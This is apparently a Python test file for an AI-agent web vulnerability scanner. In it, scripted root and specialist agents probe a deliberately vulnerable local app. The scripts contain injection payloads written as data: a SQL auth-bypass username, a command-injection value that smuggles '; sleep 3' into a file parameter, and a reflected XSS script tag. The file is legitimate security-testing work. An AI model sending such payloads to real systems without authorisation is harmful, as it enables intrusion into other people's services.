"""Multi-agent harness check WITHOUT a live LLM: a scripted root spawns all three
scripted specialists (sqli/cmdi/xss) through the REAL create_agent/wait_for_agents/
AgentCoordinator/spawn_child_agent pipeline. Every tool call actually executes (real
HTTP against a live vulnshop, real Finding registration/dedup) — only each agent's
next-tool-call decision is scripted. Proves: multi-agent spawn, concurrent execution
(children run through http_request's asyncio.to_thread offload without blocking each
other), parent/child wiring, and root's aggregation of its children's finding IDs.

Run: uv run python tests/test_multiagent_mock.py  (vulnshop must be running at :5000)
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from mock_model import ScriptedModel
from docket.config import Config
from docket.interface.scan import run_scan
from docket.report.dedupe import FindingStore

TARGET = "http://127.0.0.1:5000"

ROOT_SCRIPT = [
    ("create_agent", {
        "name": "sqli-login", "role": "sqli",
        "task": "confirm SQL injection auth bypass", "target_route": "POST /login",
    }),
    ("create_agent", {
        "name": "cmdi-export", "role": "cmdi",
        "task": "confirm blind command injection via timing", "target_route": "GET /export",
    }),
    ("create_agent", {
        "name": "xss-search", "role": "xss",
        "task": "confirm reflected XSS", "target_route": "GET /search",
    }),
    # ONE wait is enough: wait_for_agents blocks until every child is terminal, so
    # even the slow cmdi child (deliberate 3s timing probe) is included.
    ("wait_for_agents", {}),
    ("finish_scan", lambda outputs: {
        "summary": "all three specialists reported.",
        "findings": _collect_findings(outputs),
        "success": True,
    }),
]

SQLI_CHILD_SCRIPT = [
    ("http_request", {
        "method": "POST", "url": f"{TARGET}/login",
        "data": {"username": "admin' -- ", "password": "wrong"},
    }),
    ("finding", {
        "rule_type": "sqli", "severity": "high",
        "title": "SQL injection in POST /login",
        "description": "username is f-string'd into the SQL query, allowing auth bypass.",
        "location": {"url": f"{TARGET}/login", "method": "POST", "parameter": "username"},
        "poc": {
            "steps": ["POST /login with username=admin' -- "],
            "request": {"method": "POST", "url": f"{TARGET}/login", "body": {"username": "admin' -- ", "password": "wrong"}},
            "response_excerpt": "200 Welcome",
        },
    }),
    ("agent_finish", lambda outputs: {
        "summary": "Confirmed SQLi auth bypass on /login.",
        "findings": _ids(outputs),
        "success": True,
    }),
]

CMDI_CHILD_SCRIPT = [
    ("http_request", {"method": "GET", "url": f"{TARGET}/export", "params": {"file": "report.csv"}}),
    ("http_request", {"method": "GET", "url": f"{TARGET}/export", "params": {"file": "report.csv; sleep 3"}}),
    ("finding", {
        "rule_type": "command_injection", "severity": "critical",
        "title": "Command injection in GET /export",
        "description": "filename is concatenated into os.system('cat exports/' + filename); blind.",
        "location": {"url": f"{TARGET}/export", "method": "GET", "parameter": "file"},
        "poc": {
            "steps": ["inject `; sleep 3` into ?file= and observe ~3s latency delta"],
            "request": {"method": "GET", "url": f"{TARGET}/export?file=report.csv%3B+sleep+3"},
            "response_excerpt": "blind — proven via timing side-channel, not response content",
        },
    }),
    ("agent_finish", lambda outputs: {
        "summary": "Confirmed blind command injection on /export via timing.",
        "findings": _ids(outputs),
        "success": True,
    }),
]


XSS_CHILD_SCRIPT = [
    # No browser here: this test runs with use_sandbox=False, so the xss specialist
    # falls back to proving reflection over HTTP. The real DOM-execution proof
    # (dialog_message) is covered by tests/test_browser.py, which needs the container.
    ("http_request", {"method": "GET", "url": f"{TARGET}/search", "params": {"q": "<script>alert(1)</script>"}}),
    ("finding", {
        "rule_type": "xss_reflected", "severity": "medium",
        "title": "Reflected XSS in GET /search",
        "description": "q is concatenated into HTML and rendered unescaped.",
        "location": {"url": f"{TARGET}/search", "method": "GET", "parameter": "q"},
        "poc": {
            "steps": ["GET /search?q=<script>alert(1)</script> and observe the tag unescaped in the body"],
            "request": {"method": "GET", "url": f"{TARGET}/search?q=%3Cscript%3Ealert(1)%3C/script%3E"},
            "response_excerpt": "<h1>Results for <script>alert(1)</script></h1>",
        },
    }),
    ("agent_finish", lambda outputs: {
        "summary": "Confirmed reflected XSS on /search.",
        "findings": _ids(outputs),
        "success": True,
    }),
]


def _ids(outputs: dict) -> list[str]:
    """Pull finding_id out of whatever `finding` tool calls already landed in this
    agent's own conversation history."""
    return [o["finding_id"] for o in outputs.values() if isinstance(o, dict) and "finding_id" in o]


def _collect_findings(outputs: dict) -> list[str]:
    """Root's view: pull the `findings` list out of each wait_for_agents call's
    `events`, not out of `finding` calls (root never calls `finding` itself).
    Deduped via a set, since wait_for_agents reports every finished agent on each
    call — repeated calls would otherwise double-count."""
    ids: set[str] = set()
    for o in outputs.values():
        if isinstance(o, dict) and "events" in o:
            for event in o["events"]:
                ids.update(event.get("findings", []))
    return sorted(ids)


def _model_override(role: str) -> ScriptedModel:
    scripts = {
        "root": ROOT_SCRIPT,
        "sqli": SQLI_CHILD_SCRIPT,
        "cmdi": CMDI_CHILD_SCRIPT,
        "xss": XSS_CHILD_SCRIPT,
    }
    return ScriptedModel(scripts[role])


def test_root_spawns_all_three_specialists() -> None:
    store = FindingStore()
    import os
    os.environ.setdefault("DOCKET_LLM", "anthropic/claude-sonnet-5")
    config = Config.from_env()

    started = time.monotonic()
    result = run_scan(
        TARGET,
        on_finding=store.add,
        config=config,
        run_name="mock-multiagent-test",
        model_override=_model_override,
        use_sandbox=False,  # this test exercises the agent layer, not the container
    )
    elapsed = time.monotonic() - started

    assert result.success is True
    assert result.finding_count == 3, result
    assert result.agents_spawned == 4  # root + sqli + cmdi + xss
    assert len(store) == 3
    assert {f.rule_id for f in store.findings()} == {
        "sql-injection", "command-injection", "reflected-xss",
    }

    # The concurrency proof: cmdi's child alone takes ~3s (its deliberate sleep-3
    # timing probe). If http_request's asyncio.to_thread offload weren't in place,
    # that 3s block would serialize with sqli's own work on the same event loop.
    # This isn't a tight bound (real scheduling jitter, HTTP round-trips) but a
    # regression back to fully-serial execution would blow well past it.
    assert elapsed < 6.0, f"took {elapsed:.1f}s — looks serial, not concurrent"


if __name__ == "__main__":
    test_root_spawns_all_three_specialists()
    print("test_multiagent_mock: ok — root spawned all 3 specialists concurrently, all confirmed and aggregated")
